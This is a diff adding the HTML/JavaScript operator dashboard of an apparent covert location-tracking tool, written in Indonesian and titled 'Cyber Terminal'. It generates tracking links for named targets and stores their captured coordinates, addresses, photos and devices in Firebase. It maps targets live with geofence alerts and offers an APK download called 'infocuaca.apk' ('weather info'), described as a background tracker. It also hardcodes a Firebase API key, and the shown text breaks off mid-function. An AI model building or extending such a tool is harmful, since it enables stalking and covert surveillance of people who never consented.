@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>CYBER TERMINAL — RECON</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+:root{
+  --bg:#090909;--bg2:#101010;--bg3:#161616;
+  --gold:#c8a000;--gold2:#e8bc00;--gold-d:#4a3a00;
+  --cyan:#00d4ff;--cyan-d:#003a4a;
+  --green:#00c853;--green-d:#00311a;
+  --red:#ff3355;--amber:#ff8f00;
+  --text:#c8c8c8;--text-d:#555;
+  --border:#1e1e1e;--border2:#272727;--radius:4px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Courier New',monospace;background:var(--bg);color:var(--text);min-height:100vh;padding:12px;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(200,160,0,.012) 0px,rgba(200,160,0,.012) 1px,transparent 1px,transparent 4px);pointer-events:none;z-index:9999}
+.wrap{position:relative;z-index:2;max-width:620px;margin:0 auto}
+/* ── HEADER */
+.term-header{background:var(--bg2);border:1px solid var(--gold-d);border-bottom:none;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;font-size:11px;border-radius:var(--radius) var(--radius) 0 0}
+.term-header .dots{display:flex;gap:7px}
+.dot-win{width:10px;height:10px;border-radius:50%}
+.dot-win.r{background:#ff3355}.dot-win.y{background:#e8bc00}.dot-win.g{background:#00c853}
+.term-header .title{color:var(--gold);font-weight:bold;flex:1;text-align:center;letter-spacing:5px;font-size:12px;text-transform:uppercase}
+/* ── PANELS */
+.term-body{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--radius);padding:16px;margin-bottom:12px}
+.term-body.first{border-radius:0 0 var(--radius) var(--radius);border-top:1px solid var(--gold-d)}
+.welcome-video{width:100%;border:1px solid var(--gold-d);border-radius:var(--radius);display:block;margin-bottom:12px;background:#000}
+.prompt{color:var(--gold);font-size:10px;font-weight:bold;letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--gold-d)}
+.prompt::before{content:'◈  '}
+/* ── INPUTS / BUTTONS */
+.term-input{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:13px;padding:11px 12px;outline:none;margin-bottom:10px;border-radius:var(--radius);transition:border-color .2s}
+.term-input:focus{border-color:var(--gold-d)}
+.term-input::placeholder{color:var(--text-d)}
+.term-btn{width:100%;background:var(--gold);color:#000;border:none;font-family:'Courier New',monospace;font-size:11px;font-weight:bold;letter-spacing:3px;padding:12px;cursor:pointer;margin-bottom:6px;border-radius:var(--radius);text-transform:uppercase;transition:opacity .15s}
+.term-btn:active{opacity:.8}
+.term-btn.outline{background:transparent;color:var(--gold);border:1px solid var(--gold-d)}
+.term-btn.outline:hover{border-color:var(--gold)}
+.term-btn.danger{background:transparent;color:var(--red);border:1px solid rgba(255,51,85,.35)}
+/* ── TOP BAR */
+.top-bar{display:flex;justify-content:space-between;align-items:center;font-size:10px;color:var(--text-d);margin-bottom:12px;letter-spacing:1px}
+.top-bar .time{color:var(--gold);font-weight:bold;font-size:12px;letter-spacing:2px}
+.logout-btn,.chat-btn,.sound-btn{background:transparent;font-family:'Courier New',monospace;font-size:10px;padding:5px 11px;cursor:pointer;border-radius:var(--radius);letter-spacing:1px}
+.logout-btn{border:1px solid rgba(255,51,85,.4);color:var(--red)}
+.chat-btn{border:1px solid var(--cyan-d);color:var(--cyan)}
+.sound-btn{border:1px solid var(--border2);color:var(--text-d)}
+.sound-btn.active{background:var(--green-d);color:var(--green);border-color:rgba(0,200,83,.3)}
+.dot-status{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;box-shadow:0 0 6px var(--green);animation:spulse 2s ease-in-out infinite}
+@keyframes spulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--green)}50%{opacity:.6;box-shadow:0 0 2px var(--green)}}
+/* ── MAP */
+.map-box{position:relative;width:100%;height:300px;border:1px solid var(--gold-d);margin-bottom:14px;background:#000;overflow:hidden;border-radius:var(--radius)}
+.map-box.tall{height:360px}
+.map-box::before,.map-box::after{content:'';position:absolute;z-index:500;pointer-events:none;width:16px;height:16px}
+.map-box::before{top:0;left:0;border-top:2px solid var(--gold);border-left:2px solid var(--gold)}
+.map-box::after{bottom:0;right:0;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold)}
+.map-inner{position:absolute;inset:0;width:100%;height:100%}
+.map-label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.88);border:1px solid var(--gold-d);color:var(--gold);font-size:9px;font-weight:bold;letter-spacing:2px;padding:3px 8px;z-index:600;border-radius:2px}
+.map-coords{position:absolute;bottom:8px;left:8px;background:rgba(0,0,0,.88);border:1px solid var(--border2);color:var(--cyan);font-size:9px;letter-spacing:1px;padding:3px 8px;z-index:600;border-radius:2px}
+/* ── LEAFLET POPUP */
+.target-popup .leaflet-popup-content-wrapper{background:#000;border:1px solid var(--gold);border-radius:var(--radius);color:var(--gold);padding:0}
+.target-popup .leaflet-popup-tip{background:var(--gold)}
+.target-popup .leaflet-popup-close-button{display:none}
+/* ── STATS */
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.stat-card{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:13px 12px;text-align:center}
+.stat-card.hi{border-color:var(--gold-d)}
+.stat-val{font-size:22px;font-weight:bold;color:var(--gold);line-height:1.2}
+.stat-val.sm{color:var(--cyan);font-size:12px;word-break:break-word}
+.stat-lbl{font-size:9px;color:var(--text-d);letter-spacing:2px;margin-top:4px;text-transform:uppercase}
+/* ── MULTI MAP MARKER */
+@keyframes mring{0%{transform:translate(-50%,-50%) scale(1);opacity:.9}100%{transform:translate(-50%,-50%) scale(2.6);opacity:0}}
+/* ── GEOFENCE */
+.geo-row{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
+.geo-inp{flex:1;min-width:80px;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:11px;padding:9px 10px;outline:none;border-radius:var(--radius)}
+.geo-inp::placeholder{color:var(--text-d)}
+.geo-status{font-size:10px;color:var(--text-d);padding:8px;background:var(--bg3);border-radius:var(--radius);margin-bottom:8px}
+.geo-alert{font-size:11px;font-weight:bold;padding:8px;background:rgba(255,51,85,.08);border:1px solid rgba(255,51,85,.2);border-radius:var(--radius);margin-top:8px;display:none}
+/* ── CARDS */
+.card-data{border:1px solid var(--border2);padding:12px;margin-bottom:10px;background:var(--bg3);border-radius:var(--radius)}
+.card-top{display:flex;justify-content:space-between;font-size:9px;color:var(--text-d);padding-bottom:8px;border-bottom:1px solid var(--border);margin-bottom:10px;letter-spacing:.5px}
+.card-uname{color:var(--gold);font-weight:bold;font-size:10px;letter-spacing:2px}
+.card-body{font-size:11px;line-height:2}
+.card-k{color:var(--text-d);display:inline-block;min-width:88px;font-size:10px;letter-spacing:1px;text-transform:uppercase}
+.card-v{color:var(--cyan)}
+.card-v a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(0,212,255,.25)}
+.card-photo{width:72px;height:72px;object-fit:cover;border:1px solid var(--gold-d);border-radius:var(--radius);margin:8px 0;display:block}
+.card-actions{display:flex;gap:6px;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);flex-wrap:wrap}
+.card-actions button{flex:1;min-width:44px;background:transparent;border:1px solid var(--border2);color:var(--text-d);font-family:'Courier New',monospace;font-size:9px;letter-spacing:1px;padding:7px 4px;cursor:pointer;border-radius:var(--radius)}
+.card-actions button:hover{border-color:var(--gold);color:var(--gold)}
+.card-actions button.del{border-color:rgba(255,51,85,.25);color:var(--red)}
+.card-actions button.del:hover{border-color:var(--red)}
+.card-note{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text-d);font-family:'Courier New',monospace;font-size:10px;padding:8px;outline:none;resize:vertical;min-height:40px;border-radius:var(--radius);margin-top:8px}
+.card-note:focus{border-color:var(--gold-d);color:var(--text)}
+/* ── MISC */
+.log-line{font-size:10px;color:#484848;padding:3px 0 3px 10px;border-left:2px solid var(--border2);margin-bottom:3px;letter-spacing:.5px}
+.log-line.warn{border-color:var(--amber);color:var(--amber)}
+.log-line.err{border-color:var(--red);color:var(--red)}
+.empty{color:var(--text-d);font-size:11px;text-align:center;padding:24px;letter-spacing:1px}
+.search-row{display:flex;gap:8px;margin-bottom:10px}
+.search-row input,.search-row select{background:var(--bg);border:1px solid var(--border2);color:var(--text);font-family:'Courier New',monospace;font-size:11px;padding:9px 10px;outline:none;border-radius:var(--radius)}
+.search-row input{flex:2}.search-row select{flex:1}
+.search-row input::placeholder{color:var(--text-d)}
+.link-url-box{word-break:break-all;background:var(--bg);border:1px solid var(--border2);padding:10px;font-size:10px;color:var(--cyan);border-radius:var(--radius);line-height:1.6}
+.term-info{font-size:11px;line-height:2.1}
+.term-info .k{color:var(--text-d);display:inline-block;min-width:110px;letter-spacing:1px;font-size:10px;text-transform:uppercase}
+.term-info .v{color:var(--cyan)}
+.apk-steps{border-top:1px solid var(--border);margin:10px 0;padding-top:10px;font-size:10px;line-height:2.2;color:var(--text-d)}
+.apk-steps div::before{content:'›  ';color:var(--gold)}
+@keyframes sweepRotate{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--gold-d);border-radius:2px}
+/* ── CHAT */
+.chat-panel{position:fixed;inset:0;background:var(--bg);z-index:99999;display:none;flex-direction:column;padding:10px}
+.chat-panel.show{display:flex}
+.chat-inner{max-width:620px;margin:0 auto;width:100%;height:100%;display:flex;flex-direction:column;border:1px solid var(--gold-d);border-radius:var(--radius);overflow:hidden}
+.chat-head{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:var(--bg2);border-bottom:1px solid var(--gold-d);font-size:11px;gap:8px;flex-wrap:wrap}
+.chat-head .title{color:var(--gold);font-weight:bold;letter-spacing:2px}
+.chat-close,.chat-pick{background:transparent;font-family:'Courier New',monospace;font-size:10px;padding:5px 11px;cursor:pointer;border-radius:var(--radius)}
+.chat-close{border:1px solid rgba(255,51,85,.35);color:var(--red)}
+.chat-pick{border:1px solid var(--border2);color:var(--text-d)}
+.chat-msgs{flex:1;overflow-y:auto;padding:14px;background:var(--bg);display:flex;flex-direction:column;gap:8px}
+.chat-msg{padding:8px 12px;border-left:2px solid var(--border2);background:var(--bg2);border-radius:0 var(--radius) var(--radius) 0}
+.chat-msg.mine{border-left-color:var(--cyan);margin-left:16%;background:var(--cyan-d)}
+.chat-msg .mhead{display:flex;justify-content:space-between;font-size:9px;color:var(--text-d);margin-bottom:4px;gap:6px}
+.chat-msg .muser{color:var(--gold);font-weight:bold}
+.chat-msg.mine .muser{color:var(--cyan)}
+.chat-msg.mine .mhead{justify-content:flex-end}
+.chat-msg .mtext{color:var(--text);font-size:12px}
+.mdel{background:transparent;border:none;color:var(--red);font-size:11px;cursor:pointer}
+.chat-input-row{display:flex;background:var(--bg2);border-top:1px solid var(--gold-d);padding:10px;gap:8px}
+.chat-input-row input{flex:1;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:12px;padding:10px 12px;outline:none;border-radius:var(--radius)}
+.chat-input-row button{background:var(--gold);color:#000;border:none;font-family:'Courier New',monospace;font-size:11px;font-weight:bold;letter-spacing:2px;padding:0 18px;cursor:pointer;border-radius:var(--radius)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- HEADER -->
+<div class="term-header">
+  <div class="dots"><div class="dot-win r"></div><div class="dot-win y"></div><div class="dot-win g"></div></div>
+  <div class="title">Cyber Terminal</div>
+  <div style="width:40px"></div>
+</div>
+
+<!-- MAIN -->
+<div class="term-body first" style="padding:14px">
+  <div class="top-bar">
+    <div>USER&nbsp;<span id="userLabel" style="color:var(--cyan)">...</span></div>
+    <div class="time" id="liveClock">--:--:--</div>
+    <button class="logout-btn" onclick="logout()">EXIT</button>
+  </div>
+  <video class="welcome-video" id="welcomeVideo" autoplay muted playsinline loop>
+    <source src="https://cdn.jsdelivr.net/gh/roraxbali/official@main/CyberTracker.mp4" type="video/mp4">
+  </video>
+  <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap">
+    <div style="font-size:10px;color:var(--text-d)"><span class="dot-status"></span>ONLINE</div>
+    <div style="display:flex;gap:8px">
+      <button class="chat-btn" onclick="openChat()">💬 CHAT <span id="chatBadge" style="display:none;background:var(--red);color:#fff;padding:1px 5px;font-size:9px;border-radius:8px;margin-left:4px">0</span></button>
+      <button class="sound-btn active" id="soundToggle" onclick="toggleSound()">🔊 ON</button>
+    </div>
+  </div>
+</div>
+
+<!-- STATS -->
+<div class="term-body">
+  <div class="prompt">[Analytics] Overview</div>
+  <div class="stats-grid">
+    <div class="stat-card hi"><div class="stat-val" id="statTotal">0</div><div class="stat-lbl">Total Target</div></div>
+    <div class="stat-card hi"><div class="stat-val" id="statToday">0</div><div class="stat-lbl">Hari Ini</div></div>
+    <div class="stat-card"><div class="stat-val sm" id="statKota">—</div><div class="stat-lbl">Kota Terbanyak</div></div>
+    <div class="stat-card"><div class="stat-val sm" id="statPlatform">—</div><div class="stat-lbl">Platform</div></div>
+  </div>
+</div>
+
+<!-- LIVE MULTI-MAP -->
+<div class="term-body">
+  <div class="prompt">[Live] All Targets Map</div>
+  <div class="map-box tall">
+    <div id="mapMulti" class="map-inner"></div>
+    <div class="map-label" id="multiLabel">◈ MULTI-TARGET LIVE</div>
+    <div class="map-coords" id="mapMultiCount">0 targets</div>
+  </div>
+</div>
+
+<!-- GEOFENCE -->
+<div class="term-body">
+  <div class="prompt">[Alert] Geofence Monitor</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi + voice kalau target masuk zona.</div>
+  <div class="geo-row">
+    <input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any">
+    <input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any">
+    <input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px">
+  </div>
+  <div style="display:flex;gap:6px;margin-bottom:10px">
+    <button class="term-btn outline" onclick="setGeofence()" style="margin:0">[ Set Geofence ]</button>
+    <button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">[ Clear ]</button>
+  </div>
+  <div class="geo-status" id="geoStatus">Belum diset</div>
+  <div class="geo-alert" id="geoAlert"></div>
+</div>
+
+<!-- GENERATE LINK -->
+<div class="term-body">
+  <div class="prompt">[Generate] Tracking Link</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div>
+  <input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()">
+  <button class="term-btn" onclick="genLink()">[ Generate Link ]</button>
+  <div id="linkResult" style="display:none;margin-top:12px">
+    <div style="font-size:10px;color:var(--text-d);margin-bottom:6px">› target link:</div>
+    <div class="link-url-box" id="linkUrl"></div>
+    <button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button>
+  </div>
+  <!-- ADDED: GENERATE MAPS LINK -->
+  <div style="font-size:10px;color:var(--text-d);margin:14px 0 8px">› 🗺️ link maps (maps.html):</div>
+  <button class="term-btn outline" onclick="genLinkMaps()">[ 🗺️ Generate Maps Link ]</button>
+  <div id="linkResultMaps" style="display:none;margin-top:12px">
+    <div style="font-size:10px;color:var(--text-d);margin-bottom:6px">› target link (maps):</div>
+    <div class="link-url-box" id="linkUrlMaps"></div>
+    <button class="term-btn outline" id="btnCopyMaps" onclick="copyLinkMaps()" style="margin-top:10px">[ 📋 Salin Link Maps ]</button>
+  </div>
+</div>
+
+<!-- TARGET LOCATION -->
+<div class="term-body">
+  <div class="prompt">[Data] Target Location</div>
+  <div class="map-box" id="mapLinkBox">
+    <div id="mapLink" class="map-inner"></div>
+    <div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div>
+    <div class="map-coords" id="mapLinkCoords">--, --</div>
+  </div>
+  <div class="search-row">
+    <input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()">
+    <select id="filterDate" onchange="filterData()">
+      <option value="all">Semua</option>
+      <option value="today">Hari Ini</option>
+      <option value="7days">7 Hari</option>
+      <option value="30days">30 Hari</option>
+    </select>
+  </div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">
+    Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b>
+  </div>
+  <div id="hasil"><div class="empty">Waiting for data...</div></div>
+  <div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+    <button class="term-btn outline" onclick="exportCSV()" style="margin:0">[ CSV ]</button>
+    <button class="term-btn outline" onclick="exportJSON()" style="margin:0">[ JSON ]</button>
+    <button class="term-btn danger" onclick="clearAll()" style="margin:0">[ Clear ]</button>
+  </div>
+</div>
+
+<!-- MAPS LOCATION (ADDED) -->
+<div class="term-body">
+  <div class="prompt">[Data] Maps Location 🗺️</div>
+  <div class="map-box" id="mapMapsBox">
+    <div id="mapMaps" class="map-inner"></div>
+    <div class="map-label" id="mapMapsLabel">◈ AWAITING MAPS</div>
+    <div class="map-coords" id="mapMapsCoords">--, --</div>
+  </div>
+  <div class="search-row">
+    <input id="searchInputMaps" placeholder="🔍 cari target..." oninput="filterDataMaps()">
+    <select id="filterDateMaps" onchange="filterDataMaps()">
+      <option value="all">Semua</option>
+      <option value="today">Hari Ini</option>
+      <option value="7days">7 Hari</option>
+      <option value="30days">30 Hari</option>
+    </select>
+  </div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">
+    Showing&nbsp;<b id="countShownMaps" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotalMaps">0</b>
+  </div>
+  <div id="hasilMaps"><div class="empty">Waiting for maps data...</div></div>
+  <div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+    <button class="term-btn outline" onclick="exportCSVMaps()" style="margin:0">[ CSV ]</button>
+    <button class="term-btn outline" onclick="exportJSONMaps()" style="margin:0">[ JSON ]</button>
+    <button class="term-btn danger" onclick="clearAllMaps()" style="margin:0">[ Clear ]</button>
+  </div>
+</div>
+
+<!-- APK MONITOR -->
+<div class="term-body">
+  <div class="prompt">[Monitor] APK Location</div>
+  <div class="map-box">
+    <div id="mapApk" class="map-inner"></div>
+    <div class="map-label">APK TRACKER</div>
+    <div class="map-coords" id="mapApkCoords">--, --</div>
+  </div>
+  <div class="term-info">
+    <div><span class="k">USER</span><span class="v" id="apkUser">-</span></div>
+    <div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div>
+    <div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div>
+    <div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div>
+    <div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div>
+    <div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div>
+  </div>
+  <button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button>
+</div>
+
+<!-- INSTALL APK -->
+<div class="term-body">
+  <div class="prompt">[Tools] Install Tracker APK</div>
+  <div class="term-info">
+    <div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div>
+    <div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div>
+    <div><span class="k">MODE</span><span class="v">Background service</span></div>
+  </div>
+  <div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div>
+  <a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none">
+    <button class="term-btn" style="margin-top:6px">[ ▶ Download APK ]</button>
+  </a>
+</div>
+
+<!-- LOG -->
+<div class="term-body">
+  <div class="prompt">[System] Log</div>
+  <div id="logBox"><div class="log-line">Initializing...</div></div>
+</div>
+</div>
+
+<!-- CHAT -->
+<div class="chat-panel" id="chatPanel">
+  <div class="chat-inner">
+    <div class="chat-head">
+      <span class="title" id="chatTitle">◉ PRIVATE CHAT</span>
+      <button class="chat-pick" onclick="pilihLawan()">👥 Ganti</button>
+      <button class="chat-close" onclick="closeChat()">✕ Close</button>
+    </div>
+    <div class="chat-msgs" id="chatMsgs"><div class="empty">Pilih lawan bicara dulu</div></div>
+    <div class="chat-input-row">
+      <input id="chatInput" placeholder="ketik pesan..." oninput="typingSound()" onkeypress="if(event.key==='Enter')sendChat()">
+      <button onclick="sendChat()">KIRIM</button>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+const FC={apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",authDomain:"roraxbali-65802.firebaseapp.com",databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"roraxbali-65802",storageBucket:"roraxbali-65802.firebasestorage.app",messagingSenderId:"750633313866",appId:"1:750636313866:web:3d2e552960e06db83968b3"};
+const app=initializeApp(FC);const db=getDatabase(app);
+const user=localStorage.getItem('username');if(!user)location.href='index.html';
+document.getElementById('userLabel').innerText=user;
+
+// VIDEO
+const wv=document.getElementById('welcomeVideo');
+if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
+
+// SOUND
+let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
+window.toggleSound=()=>{soundEnabled=!soundEnabled;localStorage.setItem('soundEnabled',soundEnabled);const b=document.getElementById('soundToggle');if(soundEnabled){b.innerText='🔊 ON';b.classList.add('active')}else{b.innerText='🔇 OFF';b.classList.remove('active')}};
+setTimeout(()=>{const b=document.getElementById('soundToggle');soundEnabled?b.classList.add('active'):b.classList.remove('active')},100);
+function beep(f,d){if(!soundEnabled)return;try{const ac=new(window.AudioContext||window.webkitAudioContext)();const o=ac.createOscillator();const g=ac.createGain();o.type='sine';o.frequency.value=f;o.connect(g);g.connect(ac.destination);g.gain.setValueAtTime(0.12,ac.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+d);o.start();o.stop(ac.currentTime+d)}catch(e){}}
+function playKlik(){beep(2200,0.03)}
+function typingSound(){beep(1800+Math.random()*400,0.02)}
+function targetLockedSound(){let n=0;const t=setInterval(()=>{beep(1600,0.08);setTimeout(()=>beep(2000,0.08),80);n++;if(n>=20)clearInterval(t)},500)}
+function apkUpdateSound(){let n=0;const t=setInterval(()=>{beep(1200,0.06);n++;if(n>=15)clearInterval(t)},333)}
+function chatNotifSound(){let n=0;const t=setInterval(()=>{beep(1800,0.08);setTimeout(()=>beep(2400,0.08),100);n++;if(n>=6)clearInterval(t)},500)}
+function linkDataSound(){let n=0;const t=setInterval(()=>{beep(1400,0.08);setTimeout(()=>beep(1800,0.08),100);n++;if(n>=10)clearInterval(t)},500)}
+function geoSound(){beep(800,.15);setTimeout(()=>beep(1200,.15),200);setTimeout(()=>beep(1600,.2),400);setTimeout(()=>beep(2000,.3),700)}
+
+// VOICE
+let voice=null;
+function loadVoice(){if(!window.speechSynthesis)return;const vs=window.speechSynthesis.getVoices();voice=vs.find(x=>x.lang.includes('id')&&x.name.toLowerCase().includes('female'))||vs.find(x=>x.lang.includes('id'))||vs.find(x=>x.name.toLowerCase().includes('female'))||vs[0]}
+if(window.speechSynthesis){window.speechSynthesis.onvoiceschanged=loadVoice;loadVoice()}
+function ucapkan(t){if(!window.speechSynthesis)return;try{window.speechSynthesis.cancel();const u=new SpeechSynthesisUtterance(t);if(voice)u.voice=voice;u.rate=1;u.pitch=1.4;u.volume=1;u.lang='id-ID';window.speechSynthesis.speak(u)}catch(e){}}
+function hackerVoice(){ucapkan('Initiating satellite scan.');setTimeout(()=>ucapkan('Locating target position.'),2200);setTimeout(()=>ucapkan('Coordinates locked.'),4500);setTimeout(()=>ucapkan('Target acquired.'),6500)}
+
+window.logout=()=>{playKlik();localStorage.removeItem('username');location.href='index.html'};
+
+// CLOCK
+setInterval(()=>{const n=new Date();document.getElementById('liveClock').innerText=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0')+':'+String(n.getSeconds()).padStart(2,'0')},1000);
+
+// LOG
+function addLog(msg,type){const b=document.getElementById('logBox');const l=document.createElement('div');l.className='log-line '+(type||'');l.innerText='['+new Date().toLocaleTimeString('id-ID')+'] '+msg;b.appendChild(l);while(b.children.length>20)b.removeChild(b.firstChild)}
+addLog('Terminal v2 ready — user: '+user);
+
+// TILE LAYERS
+const SAT_URL='https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}';
+const LBL_URL='https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}';
+function addSatLayer(map){
+  L.tileLayer(SAT_URL,{maxZoom:19}).addTo(map);
+  L.tileLayer(LBL_URL,{maxZoom:19,opacity:0.85}).addTo(map); // jalan + nama tempat
+}
+
+// ══════════════════════════
+// FOTO-PIN MARKER (pin dgn foto di tengah)
+// ══════════════════════════
+function pinIcon(foto,name,color){
+  color=color||'#ff3355';
+  const ini=(name||'?').charAt(0).toUpperCase();
+  const imgEl=foto
+    ?`<image href="${foto}" x="9" y="8" width="36" height="36" clip-path="url(#cp)" preserveAspectRatio="xMidYMid slice"/>`
+    :`<text x="27" y="31" text-anchor="middle" font-family="Courier New" font-size="15" font-weight="bold" fill="#000">${ini}</text>`;
+  const svg=`<svg width="54" height="72" viewBox="0 0 54 72" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <clipPath id="cp"><circle cx="27" cy="26" r="17"/></clipPath>
+    </defs>
+    <path d="M27 1C13.2 1 2 12.2 2 26C2 44 27 71 27 71C27 71 52 44 52 26C52 12.2 40.8 1 27 1Z" fill="${color}" stroke="rgba(0,0,0,.4)" stroke-width="1.5"/>
+    <circle cx="27" cy="26" r="19" fill="white"/>
+    <circle cx="27" cy="26" r="17" fill="${foto?'transparent':'#f0f0f0'}"/>
+    ${imgEl}
+    <circle cx="27" cy="26" r="17" fill="none" stroke="${color}" stroke-width="2"/>
+  </svg>`;
+  return L.divIcon({
+    html:`<div style="text-align:center">${svg}<div style="font-family:'Courier New';font-size:9px;color:#c8a000;font-weight:bold;letter-spacing:1px;margin-top:1px;white-space:nowrap;background:rgba(0,0,0,.88);padding:2px 5px;border:1px solid #4a3a00;border-radius:2px;display:inline-block">${(name||'').toUpperCase()}</div></div>`,
+    className:'',
+    iconSize:[80,92],
+    iconAnchor:[40,71],
+    popupAnchor:[0,-72]
+  });
+}
+
+// ══════════════════════════
+// RADAR ICON (APK)
+// ══════════════════════════
+function radarIcon(){return L.divIcon({html:'<div style="position:relative;width:140px;height:140px"><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:50px;height:50px;border:1px solid rgba(0,255,65,.5);border-radius:50%"></div><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:90px;height:90px;border:1px solid rgba(0,255,65,.5);border-radius:50%"></div><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:130px;height:130px;border:1px solid rgba(0,255,65,.5);border-radius:50%"></div><div style="position:absolute;top:50%;left:50%;width:65px;height:65px;margin-top:-1px;transform-origin:0% 50%;background:linear-gradient(90deg,rgba(0,255,65,.9) 0%,rgba(0,255,65,.4) 40%,transparent 100%);animation:sweepRotate 2s linear infinite"></div><div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:12px;height:12px;background:#ff3355;border-radius:50%;border:2px solid #fff;box-shadow:0 0 15px #ff3355"></div></div>',className:'',iconSize:[140,140],iconAnchor:[70,70]})}
+
+// ══════════════════════════
+// STATS
+// ══════════════════════════
+function updateStats(){
+  const today=new Date();today.setHours(0,0,0,0);
+  document.getElementById('statTotal').innerText=allData.length;
+  document.getElementById('statToday').innerText=allData.filter(([,d])=>d.waktu>=today.getTime()).length;
+  const km={};allData.forEach(([,d])=>{if(d.kota){const k=d.kota.split(',')[0].trim();km[k]=(km[k]||0)+1}});
+  const tk=Object.entries(km).sort((a,b)=>b[1]-a[1])[0];
+  document.getElementById('statKota').innerText=tk?tk[0].substring(0,14):'—';
+  const pm={};allData.forEach(([,d])=>{if(d.platform){pm[d.platform]=(pm[d.platform]||0)+1}});
+  const tp=Object.entries(pm).sort((a,b)=>b[1]-a[1])[0];
+  document.getElementById('statPlatform').innerText=tp?tp[0].substring(0,12):'—';
+}
+
+// ══════════════════════════
+// MULTI-MAP — foto pin + alamat lengkap
+// ══════════════════════════
+let mapMulti=null,multiMarkers={};
+function initMapMulti(){
+  mapMulti=L.map('mapMulti',{zoomControl:true,attributionControl:false,dragging:true,scrollWheelZoom:true}).setView([0,115],3);
+  addSatLayer(mapMulti);
+}
+initMapMulti();
+
+function buildAlamat(d){
+  if(d.alamat){
+    const a=d.alamat,parts=[];
+    if(a.jalan)parts.push(a.jalan);
+    if(a.desa)parts.push(a.desa);
+    if(a.kecamatan)parts.push('Kec. '+a.kecamatan);
